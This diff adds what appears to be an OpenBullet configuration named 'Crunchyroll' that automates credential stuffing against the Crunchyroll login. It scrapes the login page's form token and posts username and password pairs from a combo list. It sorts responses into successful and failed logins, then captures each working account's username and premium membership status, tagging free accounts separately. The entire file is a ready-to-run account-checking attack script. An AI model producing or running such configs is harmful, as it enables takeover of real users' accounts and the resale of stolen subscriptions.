@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "Crunchyroll",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-21T22:00:16.9236353+02:00",
+  "AdditionalInfo": "",
+  "Author": "spicy",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get_Page REQUEST GET "https://www.crunchyroll.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Parse_Token PARSE "<SOURCE>" LR "rm[_token]\" value=\"" "\" />" -> VAR "token" 
+
+#isvalidtoken FUNCTION Length "<token>" -> VAR "isvalidtoken" 
+
+#checktoken KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<isvalidtoken>" LessThan "30" 
+
+#Main_Login REQUEST POST "https://www.crunchyroll.com/login" 
+  CONTENT "login_form[name]=<USER>&login_form[password]=<PASS>&login_form[redirect_url]=/&login_form[_token]=<token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": scheme: https" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" 
+
+#checkkey KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect login information" 
+  KEYCHAIN Success OR 
+    KEY "a href=\"/logout\"" 
+
+#Parse_Username PARSE "<SOURCE>" LR " <a href=\"/user/" "\"" -> CAP "Username" 
+
+#Parse_Sub PARSE "<SOURCE>" LR "\"premium_status\":\"" "\"," -> CAP "Membership" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Membership>" Contains "free" 
+
